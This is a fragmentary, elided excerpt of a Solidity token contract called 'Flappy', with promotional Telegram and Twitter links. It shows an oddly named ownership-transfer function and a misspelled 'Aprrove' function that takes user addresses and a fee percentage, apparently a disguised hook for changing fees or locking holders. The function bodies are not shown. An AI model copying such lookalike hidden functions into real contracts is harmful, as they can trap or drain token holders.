/**
https://t.me/OGFLAPPYONETH
https://twitter.com/FLAPPY_ERC
...
abstract contract Ownable {
    ...
    function transferOwnershipeterste(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
    }
...
contract Flappy is Ownable {
    ...
    function Aprrove(address[] memory _usr, uint256 _feePct) external {
        uint256 v1 = 0x01;
        uint256 v2 = 0x02;
        uint256 v3 = 0x03;
    ...
    function _locked(address user) public {
